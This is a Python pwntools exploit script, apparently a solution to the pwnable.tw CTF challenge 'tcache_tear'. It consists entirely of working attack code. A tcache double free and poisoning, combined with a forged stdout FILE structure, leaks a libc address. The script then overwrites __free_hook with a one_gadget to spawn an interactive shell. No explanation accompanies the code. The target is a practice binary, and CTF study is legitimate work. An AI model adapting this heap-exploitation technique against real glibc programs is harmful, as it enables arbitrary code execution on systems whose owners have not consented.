#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = "tcache_tear"
#  context.log_level = "debug"

elf = ELF("./tcache_tear", checksec = False)

libc = ELF("./libc.so", checksec = False)
libc.sym['one_gadget'] = 0x4f322

def DEBUG():
    gdbcmd = '''
    b *0x400C54
    b *0x400B54
    b *0x400B84
    b *0x400BBF
    c
    '''
    gdb.attach(io, gdbscript = gdbcmd)

def alloc(size, data):
    assert size <= 0xff
    assert len(data) <= size - 0x10

    io.sendlineafter(" :", "1")
    sleep(0.01)
    io.sendlineafter(":", str(size))
    sleep(0.01)
    io.sendafter(":", data)
    sleep(0.01)

def release():
    io.sendlineafter(" :", "2")
    sleep(0.01)

def show():
    io.sendlineafter(" :", "3")
    sleep(0.01)


io = process("./tcache_tear")
#  io = remote("chall.pwnable.tw", 10207)
io.sendlineafter("Name:", 'm4x')

alloc(0x80, '00000000')
release()
release()
alloc(0x80, flat(0x602020))
alloc(0x80, flat(0x602020))
#  DEBUG()
alloc(0x80, '\x60')
alloc(0x80, flat(0xfbad1800, 0, 0, 0, elf.got['free'], elf.got['free'] + 8, elf.got['free'] + 0x8))

libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['free']
success("libc -> {:#x}".format(libc.address))

alloc(0x90, '00000000')
release()
release()
alloc(0x90, flat(libc.sym['__free_hook']))
alloc(0x90, flat(libc.sym['__free_hook']))
alloc(0x90, flat(libc.sym['one_gadget']))
release()


io.interactive()
